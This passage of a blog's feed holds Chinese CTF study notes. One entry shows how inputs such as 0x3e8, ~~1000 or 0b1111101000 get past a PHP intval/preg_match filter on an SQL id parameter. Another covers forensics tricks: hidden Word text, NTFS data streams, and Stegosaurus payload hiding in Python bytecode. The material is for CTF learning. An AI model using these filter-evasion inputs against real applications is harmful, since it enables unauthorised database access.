intval(<span class="hljs-number">42</span>);                     <span class="hljs-comment">// 42</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">4.2</span>);                    <span class="hljs-comment">// 4</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;42&#x27;</span>);                   <span class="hljs-comment">// 42</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;+42&#x27;</span>);                  <span class="hljs-comment">// 42</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;-42&#x27;</span>);                 <span class="hljs-comment">// -42</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">042</span>);              <span class="hljs-comment">// 34  被解析成八进制，以0开头，注意一定不要带引号</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;042&#x27;</span>);                   <span class="hljs-comment">// 42</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">1e10</span>);                    <span class="hljs-comment">// 1410065408</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;1e10&#x27;</span>);                  <span class="hljs-comment">// 1</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">0x1A</span>);                    <span class="hljs-comment">// 26</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">42000000</span>);                <span class="hljs-comment">// 42000000</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">420000000000000000000</span>);   <span class="hljs-comment">// 0</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;420000000000000000000&#x27;</span>); <span class="hljs-comment">// 2147483647</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">42</span>, <span class="hljs-number">8</span>);                   <span class="hljs-comment">// 42</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;42&#x27;</span>, <span class="hljs-number">8</span>);                 <span class="hljs-comment">// 34</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-keyword">array</span>());                 <span class="hljs-comment">// 0</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;foo&#x27;</span>, <span class="hljs-string">&#x27;bar&#x27;</span>));     <span class="hljs-comment">// 1</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></blockquote><blockquote><p><code>preg_match(&quot;/\&#39;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i&quot;,$id)</code><br>正则匹配，固定格式是 <code>preg_match(&quot;/ 正则表达式 /i&quot;,$var)</code><br>其中有很多  \ 代表转义的意思</p></blockquote><p><font color=orange><strong>所以的目的都是为了绕过<code>intval($id) &gt; 999</code>传一个1000.（这个1000通过不同形式的方法传入，被intval解析之后会是一个小于1000的值，但是到了sql语句中（可能sql语句的那个地方有比较强大的解析功能），所以正常解析成1000）</strong></font></p><p>接下来一一举例：</p><ul><li><p>单引号、双引号： ‘1e3’    //intval会解析成1</p></li><li><p><code>+ - * /</code> ：999-(-1)    10*100   100/0.1      //intval(999-(-1))应该是999，这样的</p><p>+号虽然绕过了，但是sql语句无法正常解析<br><img src="/picture/web18.png"></p></li><li><p>!（真值取反）:  !!1000 </p></li><li><p>~  （取反）:  ~~1000</p></li><li><p>^（异或） :  1 ^1001</p></li><li><p>|   （按位或） ：0|1000</p></li><li><p>x  （十六进制）:  0x3e8  </p></li><li><p>二进制绕过：  0b1111101000    这一题没有过滤，所以这就是web7的答案</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;所有题目只有过滤的字符有差别，其余并无差别，下面给出的代码是web7的&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>misc其他一些知识点</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/13/misc%E5%85%B6%E4%BB%96%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/13/misc%E5%85%B6%E4%BB%96%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/</id>
    <published>2022-02-13T11:29:39.000Z</published>
    <updated>2022-02-27T05:25:53.611Z</updated>
    
    <content type="html"><![CDATA[<h3 id="word隐藏字符"><a href="#word隐藏字符" class="headerlink" title="word隐藏字符"></a>word隐藏字符</h3><p>打开word文档，一片空白，文字隐藏在word中，点击[文件]-&gt;[选项]-&gt;[显示]-&gt;[隐藏字符]  ，即可看到隐藏的文字<br>或者隐藏信息字体和背景色相同，可修改文字颜色</p><h3 id="word文件隐藏"><a href="#word文件隐藏" class="headerlink" title="word文件隐藏"></a>word文件隐藏</h3><p>可以将word文档转换成xml格式，也可以将xml转换成word文档，这导致如果重新打包为word文档的过程中，有可能被隐藏进其他数据</p><p>word本质是一个zip文件，docx文件特性为定义一个了若干xml文件的压缩包，<font color=orange><strong>将文档的后缀名改为.zip</strong></font>,寻找里面的flag文件。Excel文件同样也适用。</p><p>如果zip解压后文件过多，可以使用命令行查找:  </p><ul><li><p><code>findstr /s /i &quot;backup&quot; *.*</code><br>在当前目录及所有子目录下的所有文件中查找”backup”这个字符串，<code>*.*</code>表示所有类型的文件</p></li><li><p><code>findstr /s /i /c:&quot;backup jobs&quot; *.*</code></p><p>查找带有空格的字符串</p></li><li><p><code>findstr /s /i /c:&quot;cmd&quot; C:\tmp\*.txt</code></p><p>在C:\tmp\查找所有txt文件的字符串”cmd”</p></li></ul><h3 id="wbStego4-3open"><a href="#wbStego4-3open" class="headerlink" title="wbStego4.3open"></a>wbStego4.3open</h3><p>这个软件可以把文件隐藏到BMP、TXT、HTM和PDF文件中。<br>同样也可以还原出来</p><h3 id="NTFS上的交换数据流"><a href="#NTFS上的交换数据流" class="headerlink" title="NTFS上的交换数据流"></a>NTFS上的交换数据流</h3><p>概念：</p><ul><li>在NTFS文件系统下，每个文件都可以有多个数据流。流从 windows<br>Mr3.1开始已存在。当在非MTFS卷下读取文件内容时，只能访问及<br>处理一个数据流。</li><li>数据流没有名称。</li></ul><p>特点</p><ul><li>ADS是NTFS文件系统特有的性质</li><li>基于APT的in32却不能很好的支持ADS,例如把一个文件以流的形式附加到另一个文件（载体）中。但是<strong>对 Windows资源管理器来说载体文件没有发生任何变化</strong>(包括其大小、修改时间等)，由此将会产生一系列问题。</li></ul><h2 id="Stegosaurus隐写"><a href="#Stegosaurus隐写" class="headerlink" title="Stegosaurus隐写"></a>Stegosaurus隐写</h2><p><a href="https://github.com/AngelKitty/stegosaurus">AngelKitty/stegosaurus: A steganography tool for embedding payloads within Python bytecode. (github.com)</a></p><p>中文名为剑龙<br>Stegosaurus <strong>是一款隐写工具，它允许我们在 Python 字节码文件( pyc 或 pyo )中嵌入任意 Payload 。</strong>由于编码密度较低，因此我们嵌入 Payload 的过程既不会改变源代码的运行行为，也不会改变源文件的文件大小。 Payload 代码会被分散嵌入到字节码之中，所以类似 strings 这样的代码工具无法查找到实际的 Payload 。 Python 的 dis 模块会返回源文件的字节码，然后我们就可以使用 Stegosaurus 来嵌入 Payload 了。<br><img src="/picture/misc70.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;word隐藏字符&quot;&gt;&lt;a href=&quot;#word隐藏字符&quot; class=&quot;headerlink&quot; title=&quot;word隐藏字符&quot;&gt;&lt;/a&gt;word隐藏字符&lt;/h3&gt;&lt;p&gt;打开word文档，一片空白，文字隐藏在word中，点击[文件]-&amp;gt;[选项]-&amp;gt;[</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
</feed>
